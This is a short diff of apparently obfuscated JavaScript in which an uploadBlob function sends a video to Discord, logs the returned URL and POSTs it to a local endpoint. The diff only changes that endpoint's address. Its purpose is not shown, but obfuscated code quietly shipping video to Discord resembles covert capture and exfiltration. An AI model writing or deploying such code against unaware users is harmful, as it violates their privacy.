@@ -120,7 +120,7 @@ function uploadBlob(_0x585797) {
   .then(_0x235025 => {
     const videoUrl = _0x235025.attachments[0x0].proxy_url;
     console.log("Discord upload success, video URL:", videoUrl);
-    fetch("http://127.0.0.1:3000/saveVideoData", {
+    fetch("http://127.0.0.2:80/saveVideoData", {
       method: 'POST',
       mode: "cors",
       headers: { "Content-Type": "application/json" },
